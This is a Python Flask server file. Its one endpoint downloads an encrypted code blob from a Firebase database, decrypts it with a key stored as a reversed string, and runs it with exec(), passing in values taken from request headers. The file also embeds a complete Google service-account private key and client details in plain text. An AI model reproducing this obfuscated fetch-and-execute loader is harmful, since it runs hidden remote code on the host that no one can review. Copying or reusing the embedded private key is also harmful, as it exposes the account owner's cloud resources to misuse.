import json
import os
import requests
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import sys
import csv
import traceback
import time
import asyncio
import random
from cryptography.fernet import Fernet
import firebase_admin
from firebase_admin import credentials
from requests.adapters import HTTPAdapter
from flask import Flask, request


global command
global ac
k ='=0CI01jIDYKfGnVu3xMxJ1scQxZDFbcULoV8j0-MkMjS'
y = '/sedoc/leba/moc.oiesaberif.bdtr-tluafed-stneilc-ppa-redda-t'

auth = b'{\n  "type": "service_account",\n  "project_id": "common-t-app",\n  "private_key_id": "6d93efa04bdf26838c68c3a3b7ec184d389dc22d",\n  "private_key": "-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDRokiABHLQ3NV4\\nMVv5YCkyqzik/uZQcYk1l5BKtxDUhUUNRgnnQwunFc6kLv9XKx3TSbyZrqu4k+YU\\nlDq0AnDDWmdie4iDCXkjWx6wjxAA7MQoL6ZGGGac9Xj6Kn+yljLuToLFDLk+joQC\\niHjRh0Wyf9LkOc3jhKMibg+s31hdueQALPIEgzSoztrT66JWlmOXtNLHezm78tyn\\nj7qn9p+Q8LV1G4rHKprDLIMG0ETUAHnPHvH/ULMBl4P57S6GQn7NaFMMpbjyRIyC\\nz2QOBxF16GRuZ5CgemmreqyfPK32f64zQ31OGQEvy8KZx3BnADHnwVpI8gareHnt\\nGRXM9DEfAgMBAAECggEAYgzSdjYecbxoiBAmIayteEqHcvzaQpPoBk3+qkOXtp8i\\n3gN9TFKal6rmfPqSaXX8PEAH26XMIcfjXIq8LkfZ8DVPl8uJ3ShIJZZP82rmpFgZ\\no2YuEikFjbJuxCuukJwZ9EZ6eanq1uyXqAum3vGzUrrgq+ixeRInr0nlQQkx7pvT\\n6HotVRoun9BNdMfiUWr51jUWnS/Skd37KKmnDWKP6tMH7SgVV7MuVXS5/5g7IeDT\\nW7VChad/HWw0Vtlp0/6Ep1K0YdTFz6iy5SjM/1Ri7J7WA9YACua8AYu4BHBtQJKv\\nCv8DgjI2sPrzaEGJ4gipSRoEhEJ+RnNQd/W0BzU1KQKBgQDnuYYJ36dQsrrQB+xa\\nt03mMSxJz4H4JrXvoPDldjg+LD9YOGmuNWK1nSPEgBblwR8rejGIIjISmj8cUr+2\\npkcjQ14S77ersF/TzyGS07Ij4Z7t6dCub0ZKEl0A2qg4atq1LpHp3yrrG4pQ1iut\\n+ef/LAfZ11j5tlA7diCbRVS5hQKBgQDnmFIwt3MKAKkKNijC1qKALhgdyFdUflM5\\na6JNEnZFSYJMBeIrz42IwihRUZkWKfBnUs8t0z95ovB2qQrFMK4TRkwyXKR+jQcv\\nBx0M3XwAuI9LFZJ3c68M9qWt+KxUmT/nzve5heHk2Fpct2pmkjADnagRH6cCizI5\\nixrR/wxPUwKBgFFJpZmlGX6XlC0R+nnAP9V2foDOCFvSyJPtM1RrakN1Jit+bqQs\\nGhp3q2ptPJsQaizISsPkqwgXj/gRlystnVrjcQbXjOjvkE4vJSnqlV088pGnKgtn\\nAZNOac245rYT1fElCw6tuNKM8LJ2zw/S0O2UtpRWlOHUcMTLJZkScyw5AoGBAK6Q\\nG3No8ycY9FEkHXkuuvGOzNK2DU08opJnVMBvKAJ1s+aFkMKhAPeSET2qGY+hMPlQ\\na6UI05FlhYaLR/j2Bl+03v4e4kYZGs8Rt43Y6/zHIAriSbIL2mgVCTCmfY6OrKKX\\nWBXYmjoZ8ZJtFaAWlGZFUUcG6qV6MfM5rI+YhLjNAoGAFsH6MSzrzCPhZqc3CHqv\\nIVEwbhPwHfOf2MpEtt08wvlEUMAnV4myr7qxCEAycwwc3V0+Xq9F/GUzSHSY2/39\\nFO0bArLXX0ktCIHbulihZ56jT7Q7x1J+cKrMHat1fbJlkVuts5SXz0zWTR08jEr0\\naXzEAlKJfm3JTnHdzmHKE6M=\\n-----END PRIVATE KEY-----\\n",\n  "client_email": "firebase-adminsdk-wr14d@common-t-app.iam.gserviceaccount.com",\n  "client_id": "110876671029814549638",\n  "auth_uri": "https://accounts.google.com/o/oauth2/auth",\n  "token_uri": "https://oauth2.googleapis.com/token",\n  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",\n  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-wr14d%40common-t-app.iam.gserviceaccount.com",\n  "universe_domain": "googleapis.com"\n}\n'

def coat():
    cred = credentials.Certificate(json.loads(auth.decode()))
    #firebase_admin.initialize_app(cred)
    at = cred.get_access_token().access_token
    return str(at)



def r(a):
    a = a
    i=len(a)-1
    t=''
    while(i>=0):
        t+=a[i]
        i-=1
    return t
    
def decrypt(m,k):
    k = r(k)
    f = Fernet(k.encode())
    return f.decrypt(m).decode()
    
app = Flask(__name__)
@app.route('/')
def handler():
 th=time.time()
 command=request.headers.get('command')
 #the_code = open('ex.py','r').read()
 #command='is_authorized 251915700474'
 ac=request.headers.get('ac')
 loc = {}
 en=str(requests.get('https://common-t-app-default-rtdb.firebaseio.com/codes/'+'ex'+'.json?access_token='+coat()).json())
 dc=decrypt(en.encode(),k)
 exec(dc, globals(), loc)
 return_workaround = loc['result']
 print(return_workaround)  # 3
 return return_workaround+' '+str(time.time()-th)
